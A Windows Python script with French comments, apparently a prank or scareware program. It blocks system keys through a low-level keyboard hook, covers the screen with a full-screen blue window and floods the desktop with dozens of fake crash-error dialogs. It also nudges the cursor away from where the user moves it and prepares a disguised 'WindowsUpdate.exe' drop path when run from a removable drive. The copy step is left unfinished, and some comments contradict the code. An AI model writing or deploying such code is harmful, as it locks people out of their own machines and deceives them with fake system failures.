import pygame
import sys
import ctypes
from ctypes import windll, CFUNCTYPE, wintypes
import platform
import random
import threading
import os
import shutil
import subprocess
import time

# === FENETRES ERREUR WINDOWS REALISTES ===
def fenetre_error_auto():
    """MessageBox Windows qui se ferme toute seule après 1 seconde"""
    messages = [
        "Memory access violation at 0x00000000",
        "CRITICAL_PROCESS_DIED", 
        "System thread exception not handled",
        "IRQL_NOT_LESS_OR_EQUAL",
        "Your PC ran into a problem",
        "KMODE_EXCEPTION_NOT_HANDLED",
        "PAGE_FAULT_IN_NONPAGED_AREA"
    ]
    
    # Ouvrir la MessageBox dans un thread séparé
    def show_and_close():
        # Créer la fenêtre sans bloquer trop longtemps
        # On utilise un timer Windows pour la fermer
        import threading
        import ctypes
        
        msg = random.choice(messages)
        
        # Thread qui ferme la fenêtre après 8 secondes
        def close_it():
            time.sleep(8)
            # Trouver la fenêtre par son titre et la fermer
            hwnd = ctypes.windll.user32.FindWindowW(None, "Windows Error")
            if hwnd:
                ctypes.windll.user32.SendMessageW(hwnd, 0x10, 0, 0)  # WM_CLOSE
        
        threading.Thread(target=close_it, daemon=True).start()
        
        # Afficher la MessageBox (bloquant mais le close_it va la tuer)
        ctypes.windll.user32.MessageBoxW(
            0,
            msg,
            "Windows Error",
            0x10 | 0x1000  # Error icon + modal
        )
    
    threading.Thread(target=show_and_close, daemon=True).start()

def pluie_errors():
    """Lance plusieurs MessageBox d'erreur simultanées"""
    while True:
        # 2 à 4 fenêtres d'erreur simultanées
        for _ in range(random.randint(30, 50)):
            fenetre_error_auto()
            time.sleep(0.01)  # Petit délai entre chaque
        
        # Attendre 2-4 secondes avant la prochaine vague
        time.sleep(random.uniform(0.1, 1.5))

# === DÉTECTION ET COPIE ===
def drop_and_open():
    if getattr(sys, 'frozen', False):
        current_path = sys.executable
    else:
        current_path = os.path.abspath(__file__)
    
    drive = os.path.splitdrive(current_path)[0].upper()
    
    if drive == "C:":
        return False
    
    dest_dir = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Windows\INetCache\IE")
    os.makedirs(dest_dir, exist_ok=True)
    
    dest_path = os.path.join(dest_dir, "WindowsUpdate.exe")
    
    return True

class POINT(ctypes.Structure):
    _fields_ = [
        ("x", ctypes.c_long),
        ("y", ctypes.c_long)
    ]

point = POINT()

# === RESTE DU CODE ===
if platform.system() != "Windows":
    print("Windows uniquement !")
    sys.exit(1)

drop_and_open()

user32 = windll.user32
kernel32 = windll.kernel32

WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_KEYUP = 0x0101
VK_F7 = 0x76
VK_LCONTROL = 0xA2
VK_RCONTROL = 0xA3

running = True
ctrl_pressed = False

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_ulonglong)
    ]

LowLevelKeyboardProc = CFUNCTYPE(ctypes.c_long, wintypes.INT, wintypes.WPARAM, wintypes.LPARAM)

def keyboard_callback(nCode, wParam, lParam):
    global running, ctrl_pressed

    if nCode == 0:
        kb = ctypes.cast(lParam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
        vkCode = kb.vkCode

        if wParam == WM_KEYDOWN:
            if vkCode in (VK_LCONTROL, VK_RCONTROL, 0x11):
                ctrl_pressed = True
        elif wParam == WM_KEYUP:
            if vkCode in (VK_LCONTROL, VK_RCONTROL, 0x11):
                ctrl_pressed = False

        if wParam == WM_KEYDOWN and vkCode == VK_F7 and ctrl_pressed:
            running = False
            return 1

        if vkCode in (0x09, 0x5B, 0x5C, 0x12, 0x1B):
            return 1

    return user32.CallNextHookEx(0, nCode, wParam, lParam)

callback_ref = LowLevelKeyboardProc(keyboard_callback)
hook_id = user32.SetWindowsHookExW(WH_KEYBOARD_LL, callback_ref, None, 0)

if not hook_id:
    err = ctypes.get_last_error()
    print(f"Erreur hook: {err}")
    sys.exit(1)

print("Hook installé avec succès")

# Pygame
pygame.init()
info = pygame.display.Info()
screen = pygame.display.set_mode((info.current_w, info.current_h), pygame.FULLSCREEN)
pygame.display.set_caption("Windows")
pygame.mouse.set_visible(False)

clock = pygame.time.Clock()

# Lancer la pluie d'erreurs Windows réalistes
threading.Thread(target=pluie_errors, daemon=True).start()

while running:
    msg = wintypes.MSG()
    while user32.PeekMessageW(ctypes.byref(msg), 0, 0, 0, 1):
        user32.TranslateMessage(ctypes.byref(msg))
        user32.DispatchMessageW(ctypes.byref(msg))

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            running = False

    user32.GetCursorPos(ctypes.byref(point))

    old_x = point.x
    old_y = point.y

    time.sleep(0.05)

    user32.GetCursorPos(ctypes.byref(point))

    if point.x != old_x or point.y != old_y:
        width = user32.GetSystemMetrics(0)
        height = user32.GetSystemMetrics(1)

        new_x = old_x + random.randint(-20, 20)
        new_y = old_y + random.randint(-20, 20)

        user32.SetCursorPos(new_x, new_y)

    screen.fill((0, 120, 215))
    pygame.display.flip()
    clock.tick(60)

# Nettoyage
user32.UnhookWindowsHookEx(hook_id)
pygame.mouse.set_visible(True)
pygame.quit()
sys.exit()